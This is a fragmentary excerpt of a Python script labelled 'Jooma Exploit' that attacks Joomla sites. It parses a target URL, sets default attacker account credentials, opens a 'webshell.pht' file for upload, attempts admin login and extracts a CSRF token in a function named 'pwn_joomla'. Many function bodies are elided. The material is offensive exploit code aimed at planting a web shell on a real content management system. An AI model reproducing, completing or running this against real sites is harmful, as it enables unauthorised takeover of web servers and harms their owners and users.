...
def try_admin_login(options, sess):
	...
	resp = sess.post(admin_url, verify=False)
...
def parse_options():
	try:
		exploit_file = open('webshell.pht', 'r')
	except Exception:
		exploit_file = None
	parser = argparse.ArgumentParser(description='Jooma Exploit')
	parser.add_argument('url', help='Base URL for Joomla site')
	parser.add_argument('-u', '--username', default='aftereffector')
	parser.add_argument('-p', '--password', default='password')
	parser.add_argument('-e', '--email', default='aftereffector@domain.tld')
...
def pwn_joomla(options):
	...
	print("[-] Getting token")
	resp = sess.post(options.url + "/index.php/component/users/?view=login", verify=False)	
	token = extract_token(resp)
	#if not token:
	#	return False
